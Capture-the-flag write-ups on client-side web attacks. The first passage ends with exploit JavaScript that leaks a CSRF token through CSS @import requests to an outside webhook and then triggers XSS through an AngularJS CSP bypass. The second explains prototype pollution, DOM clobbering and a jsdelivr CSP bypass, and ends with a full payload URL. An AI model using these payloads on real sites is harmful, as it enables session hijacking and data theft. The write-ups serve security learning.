            https://www.youtube.com/embed/srcdoc=<script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"><\/script><script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"><\/script><div/ng-app/ng-csp>{{[].empty.call().alert([].empty.call().document.domain)}}</div>.jpg
            `;
            await sleep(1000);
            w.f.submit();
        }

        function leak_csrf_token() {
            console.log("leak");
            let css_payload = `@import url("https://${webhook}/css?i=${ID}");\n`;
            for (let i = 1; i < 40; ++i) {
                css_payload += `@import url("https://${webhook}/css?i=${ID}&t=${i + 0.6}");\n`;
            }
            let url = URL + '/app.php#msg=' + encodeURIComponent(
                        \x3ch1>Wait \x3c/h1>
                        \x3cstyle>
                                    head, meta{display:block}
                        \x3c/style>
                        \x3cstyle>
                            ${css_payload}	
                        \x3c/style>
                        `
            );
            w.location = url;
            console.log(url);
            let check_interval_id = setInterval(() => {
                fetch(`/now_token?i=${ID}`).then(
                    r => r.text()
                ).then(
                    token => {
                        document.getElementById('token').innerText = `Now Token: ${token}`;
                        if (token.length >= 32) {
                            clearInterval(check_interval_id);
                            console.log(token);
                            xss(token); 
                        }
                    }
                );
            }, 5500);
        }

        function exploit() {
            login(`"><img name=domain `);
            setTimeout(() => {
                prototype_pollution();
                setTimeout(() => {
                    leak_csrf_token();
                }, 4000);
            }, 3000);
        }
    </script>
</head>

<body>
    <h1 id="token">Token: </h1>
    <button onclick="exploit()">Exploit</button>
</body>
</html>
```
Just as reminder, there will be a server specified inside `webhook` that is going to perform this code:`[name=csrf-token][content^="%s"]{background-image: url("%s");}` in order to bruteforce the token.
You should also read this article to understand the difference between chrome and firefox when it comes to XS-Leak via CSS Injection: https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/

## Thanks
I would like to thank Huli very much for creating this challenge with me, also, Kudos to Igor for his research about the nested conditions and Strellic for teaching me a lot with his challenges.
I am going to link every study material from which we took inspiration and which you can read to learn the basics of some attacks used in this challenge :

#### Nested Condition Research:
https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/#:~:text=Nested%20condition%20is%20when%20one,both%20by%20developers%20and%20hackers. 

#### XS-Leak via CSS Injection material:
https://xsleaks.dev/docs/attacks/css-injection/ 
https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d 
https://x-c3ll.github.io/posts/CSS-Injection-Primitives/

#### Dom Clobbering Material:
https://portswigger.net/web-security/dom-based/dom-clobbering
https://brycec.me/posts/htb_unictf_analytical_engine
https://terjanq.medium.com/dom-clobbering-techniques-8443547ebe94

#### Prototype Pollution Material:
https://blog.s1r1us.ninja/research/PP
https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications
https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/

To conclude, I hope you enjoyed the challenge and learned something new :D, see you at the next challenge. Ciaooooo ![](https://i.imgur.com/YIgjfY6.gif)




### File: CTF-Writeups/securityboat-challenge/Readme.md

## Securityboat challenge
![2022-12-05_16-55](https://user-images.githubusercontent.com/59454895/205682163-7dbc6b1b-2279-4f43-a2bc-7a702228b692.png)

The web-site doesn't have a ton of features. it is possible to insert a note and a title, then the user can view the content just inserted.
Looking at the code, it is immediately possible to identify the injection point:

![2022-12-05_17-02](https://user-images.githubusercontent.com/59454895/205683886-012d1e35-0d2c-40a5-8a0e-f6b5a9acd38a.png)

### Injection Point
in the code above ```localStorage.flag``` is passed to ```InnerHTML``` which is a common pattern that can lead to XSS if we could control the content of ```localStorage```, but ```localStorage``` is going to inherit from the Object.prototype. It means that if we have an client-side prototype pollution we can to control the localStorage value and insert a malicious content, here there is an example:

![2022-12-05_17-30](https://user-images.githubusercontent.com/59454895/205690366-1a23ef2c-4acd-4336-811e-019c53515d58.png)

I managed to confirm the presence of prototype pollution in this way:

![2022-12-05_19-14](https://user-images.githubusercontent.com/59454895/205711384-3b05731e-58ab-4b2d-a08e-11733a032b2b.png)

Now that the vulnerability is confirmed, the condition ```if(document.domain !== 'ctf.securityboat.in')``` must be bypassed in order to reach the injection point, to do it we can use a vulnerability called dom clobbering.

### Dom Clobbering

With Dom Clobbering is also possible to clobber `document` properties with some tags, like the `<img>` or `<form>` tag, let's make an example:


![](https://i.imgur.com/3Nn3xJp.png)

You can see how `document.URL` is returning a string with the url of the page, but after I put `<img name=URL>` the img element will be returned instaed of the string, let's make another example:

![](https://i.imgur.com/SgBmupO.png)

As you can see in this screenshot, if we have an img tag on the page with the name attribute set to “try”, “document.try” now refers to this HTML element.
As you might now have guessed, we can use this technique to override the “document.domain” variable with an HTML element and bypass the condition.

Now that this concept is clear, we can use something like `https://ctf.securityboat.in/?title=a1&body=1&subject=a%3Cform%20name=DOMAIN%3E%3C/form%3E&__proto__[flag]=%3Cimg%20src=x%20onerror=alert()%3E`. 

The first part (`<form name=DOMAIN>`) is related to the dom clobbering technique that we need in order to bypass the condition and reach the injection point described above, the second part of the payload is usefull to us because we can pollute `flag` with our malicious content, but the alert won't pop up because there is a CSP to bypass.

### CSP Bypass and Conclusion

These were the rules of the CSP inside a meta tag:
```html
 <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'self'; style-src 'unsafe-inline' https://cdn.jsdelivr.net; font-src  https://cdn.jsdelivr.net; script-src 'self' https://cdn.jsdelivr.net; object-src 'none'"
 />
```
Here the bypass is very simple, the directive ```'script-src'``` is accepting ```jsdeliver```, therefore, inside ```jsdeliver``` there is a well known bypass that we can abuse to bypass the csp:

```html
 <script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/sval-classic.js"></script>
  <br csp="alert(1)">
```
Full Payload:

```https://ctf.securityboat.in/?title=a1&body=1&subject=a<form name=DOMAIN></form>&__proto__[flag]=<iframe srcdoc="<br csp=alert(localStorage.getItem('flag'))><script src=https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js></script>"></iframe>```



